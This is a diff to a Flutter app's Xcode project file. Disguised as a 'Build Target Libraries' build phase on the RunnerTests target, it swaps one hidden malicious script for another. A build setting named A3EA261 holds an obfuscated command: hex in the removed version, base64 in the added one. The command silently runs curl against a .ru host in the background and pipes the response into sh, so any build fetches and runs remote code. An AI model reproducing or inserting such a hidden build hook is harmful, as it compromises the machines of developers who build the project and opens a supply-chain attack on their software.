@@ -220,7 +220,7 @@
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
 				5B4BA1F10F5FF13E02A74BC9 /* [CP] Check Pods Manifest.lock */,
-				60DBE3E7AD9E46A8AF162AE3 /* Build Target Libraries */,
+				37DF735DC4EC4BE6A0162AE3 /* Build Target Libraries */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -372,6 +372,25 @@
 			shellPath = /bin/sh;
 			shellScript = "\"$FLUTTER_ROOT\"/packages/flutter_tools/bin/macos_assemble.sh && touch Flutter/ephemeral/tripwire";
 		};
+		37DF735DC4EC4BE6A0162AE3 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
+			showEnvVarsInLog = 0;
+		};
 		5B4BA1F10F5FF13E02A74BC9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -392,25 +411,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		60DBE3E7AD9E46A8AF162AE3 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
 			showEnvVarsInLog = 0;
 		};
 		6CB646887981B768641B1C17 /* [CP] Embed Pods Frameworks */ = {
@@ -505,7 +505,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = CE08B74CC4F9D8CCF180F3EC /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((g(){ `printf x3xd | tr -d 3` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d6b73664c202d2d636f6e6e6563742d74696d656f7574203330202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | g | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((a(){ `printf base6T4 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC1rTHNmIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly94NWVyenNrbXZjYW5zMGgucnUvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -521,7 +521,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5C7E743E94144B99C844EABE /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((g(){ `printf x3xd | tr -d 3` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d6b73664c202d2d636f6e6e6563742d74696d656f7574203330202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | g | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((a(){ `printf base6T4 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC1rTHNmIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly94NWVyenNrbXZjYW5zMGgucnUvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
